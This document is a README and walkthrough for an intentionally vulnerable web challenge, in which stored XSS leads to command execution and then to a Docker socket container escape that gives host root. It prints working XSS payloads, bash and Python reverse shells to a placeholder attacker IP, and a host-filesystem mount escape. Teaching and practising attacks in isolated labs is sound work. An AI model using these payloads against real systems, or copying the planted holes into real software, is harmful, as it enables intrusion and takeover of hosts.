# 🔓 XSS to RCE Challenge - Docker Escape

## ⚠️ WARNING
**THIS APPLICATION CONTAINS INTENTIONAL SECURITY VULNERABILITIES!**

- **DO NOT** deploy in production
- **DO NOT** expose to the internet
- Use **ONLY** in isolated environments
- For **educational purposes ONLY**

## 📋 Challenge Overview

This is a simplified vulnerable web platform designed to teach:
1. **XSS (Cross-Site Scripting)** exploitation
2. **XSS to RCE** (Remote Code Execution) escalation
3. **Docker container escape** via exposed Docker socket
4. **Privilege escalation** to root on host system

### 🎯 Objective

Exploit the vulnerabilities to become root on the host system and capture the flag located in `/root/flag.txt`.

## 🚀 Quick Start

### Prerequisites
- Docker and Docker Compose
- Basic understanding of XSS and Docker

### Setup

1. **Create the flag on your host system (before starting the container):**
   ```bash
   sudo su
   echo "FLAG{congratulations_you_escaped_and_became_root}" > /root/flag.txt
   chmod 600 /root/flag.txt
   exit
   ```

2. **Start the challenge:**
   ```bash
   cd vulnerable-platform
   docker-compose up -d --build
   ```

3. **Access the application:**
   ```
   http://localhost:5000
   ```

4. **Stop the challenge:**
   ```bash
   docker-compose down
   ```

## 🎓 Challenge Walkthrough

### Step 1: Identify XSS Vulnerability

The message board allows users to post messages. Test for XSS:

```html
<script>alert('XSS')</script>
```

**Expected Result:** The alert should execute, confirming Stored XSS.

### Step 2: Exploit XSS for RCE

There's a hidden `/execute` endpoint that accepts command execution. Create an XSS payload to interact with it:

```html
<script>
fetch('/execute', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'cmd=whoami'
})
.then(r => r.text())
.then(data => {
    document.body.innerHTML += '<div style="background:yellow;padding:20px;margin:10px;"><pre>' + data + '</pre></div>';
});
</script>
```

**Expected Result:** The output of `whoami` should appear on the page.

### Step 3: Get a Reverse Shell

Set up a listener on your attacking machine:
```bash
nc -lvnp 4444
```

Then post this XSS payload (adjust IP address to your host IP):

```html
<script>
fetch('/execute', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'cmd=bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"'
});
</script>
```

**Note:** Replace `YOUR_IP` with your actual IP address accessible from the container.

Alternative Python reverse shell:
```html
<script>
fetch('/execute', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'cmd=python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'YOUR_IP\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/bash\',\'-i\'])"'
});
</script>
```

**Expected Result:** You should receive a shell connection.

### Step 4: Verify Docker Environment

Inside the shell, verify you're in a container:

```bash
cat /proc/1/cgroup
ls -la /.dockerenv
```

Check for Docker socket:
```bash
ls -la /var/run/docker.sock
```

**Expected Result:** Docker socket should be present and accessible.

### Step 5: Docker Escape via Socket

Install Docker CLI in the container (if not present):

```bash
curl -fsSL https://get.docker.com -o get-docker.sh
sh get-docker.sh
```

Or use existing Docker binary if available.

List containers:
```bash
docker ps
```

Create a privileged container with host filesystem mounted:
```bash
docker run -v /:/hostfs --rm -it alpine chroot /hostfs sh
```

**Expected Result:** You now have a root shell on the host system!

### Step 6: Capture the Flag

```bash
cat /root/flag.txt
```

**Expected Output:**
```
FLAG{congratulations_you_escaped_and_became_root}
```

🎉 **Congratulations! You've completed the challenge!**

## 🔍 Technical Details

### Vulnerability 1: Stored XSS
- **Location:** Message board (`/` and `/post`)
- **Cause:** User input rendered with `| safe` filter without sanitization
- **Impact:** JavaScript execution in victim's browser

### Vulnerability 2: RCE Endpoint
- **Location:** `/execute` endpoint
- **Cause:** Direct command execution via `subprocess` with `shell=True`
- **Impact:** Arbitrary command execution on the container

### Vulnerability 3: Docker Socket Exposed
- **Location:** Docker configuration
- **Cause:** `/var/run/docker.sock` mounted in container
- **Impact:** Container can control Docker daemon and create privileged containers

## 🛡️ Learning Objectives

This challenge teaches:

1. **XSS Exploitation:** How to identify and exploit Cross-Site Scripting vulnerabilities
2. **XSS to RCE:** How XSS can be escalated to remote code execution
3. **Reverse Shells:** How to establish reverse shell connections
4. **Docker Architecture:** Understanding container isolation
5. **Docker Socket Risk:** Why exposing Docker socket is dangerous
6. **Container Escape:** Techniques to escape containerized environments
7. **Privilege Escalation:** Path from container user to host root

## 🔧 Troubleshooting

### Container won't start
```bash
docker-compose down
docker-compose up --build
```

### Can't get reverse shell
- Check firewall rules
- Verify IP address is correct
- Try different reverse shell payloads
- Use direct command execution first to debug

### Docker socket not accessible
```bash
# Inside container
ls -la /var/run/docker.sock
docker ps  # Should work if socket is properly mounted
```

## 📚 Additional Resources

- OWASP XSS Guide: https://owasp.org/www-community/attacks/xss/
- Docker Security: https://docs.docker.com/engine/security/
- Container Escape Techniques: Research papers and security blogs

## ⚖️ Legal Disclaimer

This platform is for **educational purposes only**. 

- ✅ Use only in isolated, controlled environments
- ✅ Obtain proper authorization before testing
- ✅ Follow ethical hacking principles
- ❌ Do not use against systems without explicit permission

**Unauthorized access to computer systems is illegal.**

---

**Remember: Learn responsibly and ethically!** 🛡️
